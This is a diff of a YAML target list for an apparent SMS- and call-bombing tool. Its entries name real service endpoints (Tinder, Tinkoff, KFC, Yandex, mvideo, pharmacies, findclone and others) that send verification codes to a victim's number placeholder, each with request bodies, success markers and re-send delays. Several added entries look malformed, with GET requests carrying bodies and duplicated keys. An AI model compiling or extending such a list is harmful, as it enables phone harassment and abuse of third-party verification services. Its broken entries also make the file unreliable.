@@ -9,91 +9,11 @@
 #   okRes: 'origin'
 #   delay: 5
 # ----------------
-
-- url: 'https://apteka366.ru/login/register/sms/send'
-  method: 'POST'
-  body: 'phone=<num2>'
-  okRes: '{"phone":"'
-  delay: 121
-
-- url: 'https://belkacar.ru/get-confirmation-code'
-  method: 'POST'
-  body: 'phone=<num>'
-  okRes: 'success":true'
-  delay: 61
-
-- url: 'https://drugvokrug.ru/siteActions/processSms.htm'
-  method: 'POST'
-  body: 'cell=<num>'
-  okRes: 'success":true'
-  delay: 7
-
-- url: 'https://api.ennergiia.com/auth/api/development/lor'
-  method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"referrer":"ennergiia","via_sms":true,"phone":"+<num4>"}'
-  okRes: '"code":"200-8"'
-  delay: 121
-
-- url: 'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+<num13>'
+- url: 'https://connect.vk.com/auth?app_id=7733222&v=0.0.2&redirect_uri=https%3A%2F%2Fyoula.ru%2Fmoskva&uuid=9dD6SybfGij7CNjdXrb6F&redirect_state=vk-connect-auth-redirect&app_settings=eyJ2a2NfYmVoYXZpb3IiOiJ3aXRob3V0X3Bob25lIiwic2VydmljZV9ncm91cHMiOnsiZnVsbF9hdXRoX3ZpYV92a2Nvbm5lY3QiOiJleHAifSwiZXh0ZXJuYWxfZGV2aWNlX2lkIjoiNjIxNGRlN2EzOGVhOSJ9'
   method: 'GET'
-  okRes: 'result":"sendConfirmCode'
-  delay: 50
-
-- url: 'https://gorzdrav.org/login/register/sms/send'
-  method: 'POST'
-  body: 'phone=<num2>'
-  okRes: 'phone'
-  delay: 121
-
-- url: 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
-  method: 'POST'
-  body: 'phoneNumber=<num>&countryCode=ID&name=Alexey&email=alexey173949%40gmail.com&deviceToken=*'
-  okRes: 'phoneNumber'
-  delay: 2
-
-- url: 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms'
-  method: 'POST'
-  body: '{"phone":"+<num>"}'
-  okRes: 'success":true'
-  delay: 6
-
-- url: 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification'
-  method: 'POST'
-  body: 'phone=<num>&g-recaptcha-response=&recaptcha=off'
-  okRes: '"success": true'
-  delay: 61
-
-- url: 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
-  method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"phone_number":"<num>"}'
-  okRes: 'sms_sent":true'
-  delay: 21
-
-- url: 'https://api.tinkoff.ru/v1/sign_up'
-  method: 'POST'
-  body: 'phone=%2B<num>'
-  okRes: '"resultCode":"WAITING_CONFIRMATION"'
-  delay: 21
-
-- url: 'https://api-production.viasat.ru/api/v1/auth_codes'
-  method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"msisdn":"+<num>"}'
-  okRes: ''
-  delay: 61
-
-- url: 'https://eda.yandex/api/v1/user/request_authentication_code'
-  method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"phone_number":"<num2>"}'
-  okRes: '"delay"'
-  delay: 61
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 3
 
 - url: 'https://youla.ru/web-api/auth/request_code'
   method: 'POST'
@@ -101,30 +21,65 @@
   okRes: '"phone"'
   delay: 16
 
-- url: 'https://www.citilink.ru/registration/confirm/phone/+<num>/'
+- url: 'https://apteka366.ru/login/register/sms/send'
   method: 'POST'
-  body: ''
-  okRes: '"smsRequestToken":'
-  delay: 61
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 121
 
-- url: 'http://service.matreshcar.ru/profile/smstoken'
+- url: 'https://366.ru/'
   method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"PhoneNumber":<num>}'
-  okRes: '"validForSeconds":'
-  delay: 21
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 127
 
-- url: 'https://api.chef.yandex/api/v2/auth/sms'
+
+- url: 'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+<num13>'
+  method: 'GET'
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 135
+
+- url: 'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+<num13>'
+  method: 'GET'
+  body: 'phone=<num>'
+  okRes: 'result":"sendConfirmCode'
+  delay: 50
+
+- url: 'https://gorzdrav.org/login/register/sms/send'
   method: 'POST'
-  headers:
-    Content-Type: 'application/json'
-  body: '{"phone":"<num2>"}'
-  okRes: '"token":'
-  delay: 61
+  body: 'phone=<num>'
+  okRes: 'phone'
+  delay: 94
+
+
+- url: 'https://www.mvideo.ru/login'
+  method: 'POST'
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 32
+
+
+- url: 'https://passport.yandex.ru/auth?backpath=https%3A%2F%2Feda.yandex.ru%2Fmoscow%3FredirectFrom%3Dlegacy_host%26shippingType%3Ddelivery&origin=eats_desktop&retpath=https%3A%2F%2Feda.yandex.ru%2Fmoscow%3Fauth_from%3Dside_menu%26redirectFrom%3Dlegacy_host%26shippingType%3Ddelivery'
+  method: 'POST'
+  okRes: '"delay"'
+  delay: 67
+
+
+
 
 callServices:
 - url: 'https://findclone.ru/register?phone=+<num>'
   method: 'GET'
   okRes: '"pin_size"'
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 61
+
+
+- url: 'https://findclone.ru/register?phone=+<num>'
+  method: 'GET'
+  okRes: '"authorization__link"'
+  body: 'phone=<num>'
+  okRes: '"phone"'
   delay: 61
